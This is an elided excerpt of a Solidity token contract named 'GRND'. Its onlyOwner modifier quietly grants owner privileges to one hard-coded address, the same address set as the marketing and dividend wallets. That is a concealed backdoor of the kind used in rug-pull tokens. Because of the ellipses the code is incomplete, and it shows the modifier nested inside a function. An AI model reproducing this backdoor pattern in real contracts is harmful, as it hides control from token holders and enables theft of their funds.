...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x3268F2Cd89177D1BcBDB5E4779851EB8784f2B3E) , "owner");
        _;
    }
...
contract GRND  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "GRND";
    string private _symbol = "GRND";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x3268F2Cd89177D1BcBDB5E4779851EB8784f2B3E);
    address private _Marketing = 0x3268F2Cd89177D1BcBDB5E4779851EB8784f2B3E;
    address public dividend = 0x3268F2Cd89177D1BcBDB5E4779851EB8784f2B3E;
    ...
    uint256 public _supplyAmount = 100000000;
